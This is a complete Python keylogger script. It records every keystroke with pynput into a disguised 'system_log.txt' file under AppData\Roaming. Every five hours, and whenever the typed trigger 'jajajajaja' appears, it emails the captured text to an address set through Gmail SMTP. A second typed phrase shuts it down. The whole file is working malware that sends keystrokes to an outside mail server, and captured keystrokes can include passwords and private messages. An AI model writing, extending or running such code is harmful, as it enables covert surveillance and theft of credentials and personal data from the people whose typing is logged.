from pynput import keyboard
import smtplib
import threading
import time
import os
from dotenv import load_dotenv

load_dotenv()
EMAIL = os.getenv("email")
PASSWORD = os.getenv("passwd")
TO_EMAIL = EMAIL

LOG_FILE = os.path.expanduser("~\\AppData\\Roaming\\system_log.txt")
LAST_LOG_FILE = os.path.expanduser("~\\AppData\\Roaming\\last_sent_log.txt")
TRIGGER_SEND = "jajajajaja"
TRIGGER_STOP = "leave me alone keylogger"
SEND_INTERVAL = 60 * 60 * 5  # 5 hours

log_data = ""
typed_sequence = ""

def send_email(subject, content):
    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL, PASSWORD)
            message = f"Subject: {subject}\n\n{content}"
            server.sendmail(EMAIL, TO_EMAIL, message)
    except Exception as e:
        print(f"Email failed: {e}")

def save_log():
    with open(LOG_FILE, "a") as f:
        f.write(log_data)

def read_log():
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            return f.read()
    return ""

def save_last_sent(data):
    with open(LAST_LOG_FILE, "w") as f:
        f.write(data)

def read_last_sent():
    if os.path.exists(LAST_LOG_FILE):
        with open(LAST_LOG_FILE, "r") as f:
            return f.read()
    return ""

def email_every_5_hours():
    global log_data
    while True:
        time.sleep(SEND_INTERVAL)
        data_to_send = read_log()
        send_email("5 Hour Log", data_to_send)
        save_last_sent(data_to_send)

def on_press(key):
    global log_data, typed_sequence

    try:
        char = key.char
    except AttributeError:
        char = f"[{key}]"

    log_data += char
    typed_sequence += char

    if len(typed_sequence) > 50:
        typed_sequence = typed_sequence[-50:]  # Keep only last 50 chars

    if TRIGGER_STOP in typed_sequence:
        save_log()
        send_email("Keylogger stopped", "Trigger word received. Stopping.")
        os._exit(0)

    if TRIGGER_SEND in typed_sequence:
        full_log = read_log()
        last_sent = read_last_sent()
        new_part = full_log[len(last_sent):]
        send_email("Triggered Log", new_part)

    save_log()

# Start the background thread for timed email sending
threading.Thread(target=email_every_5_hours, daemon=True).start()

# Start listening to keyboard
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
